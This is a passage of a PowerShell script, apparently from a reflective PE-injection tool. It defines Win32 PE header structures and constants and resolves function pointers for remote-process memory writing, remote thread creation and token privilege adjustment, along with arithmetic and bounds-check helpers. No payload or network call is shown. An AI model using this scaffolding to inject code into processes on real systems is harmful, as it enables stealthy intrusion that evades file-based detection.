        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress 
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    

            
    
    
    

    
    
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw ""Cannot subtract bytearrays of different sizes""
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw ""Cannot add bytearrays of different sizes""
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw ""Cannot compare byte arrays of different size""
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = ""0x{0:X$($ValueSize)}"" -f [Int64]$Value 

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = ""EndAddress"", Position = 3, Mandatory = $true)]
        [IntPtr]
        $EndAddress,
        
        [Parameter(ParameterSetName = ""Size"", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr]::Zero
        if ($PsCmdlet.ParameterSetName -eq ""Size"")
        {
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        }
        else
        {
            $FinalEndAddress = $EndAddress
        }
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw ""Trying to write to memory smaller than allocated address range. $DebugString""
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw ""Trying to write to memory greater than allocated address range. $DebugString""
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
